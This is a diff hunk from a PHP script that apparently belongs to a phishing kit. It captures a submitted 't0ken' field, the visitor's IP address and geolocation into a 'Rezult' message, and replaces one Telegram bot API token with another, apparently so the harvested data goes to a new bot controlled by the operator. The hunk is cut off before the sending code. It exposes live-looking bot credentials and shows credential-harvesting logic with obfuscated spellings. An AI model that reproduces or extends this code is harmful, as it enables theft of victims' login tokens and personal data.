@@ -74,7 +74,7 @@ $_SESSION['USER'] = $_POST['t0ken'];
 
 $message = "OHT||fic0-Rezult||\n\n"."\nIP: ".$_SERVER['REMOTE_ADDR']."\n".'t0ken-1: '.$_SESSION['USER']."\n";
 $message .= " Ubicaci0n= ".$pais." ".$region." ".$ciudad."\r\n";
-$apiToken = "5950846678:AAE8_0jGBpZx6nSiq_WB1wloSPnKP7Ee8RQ";
+$apiToken = "6530876143:AAEyoJNln52rvnJcR5yqMzsjySr502EaPGc";
 
 
 $data = [
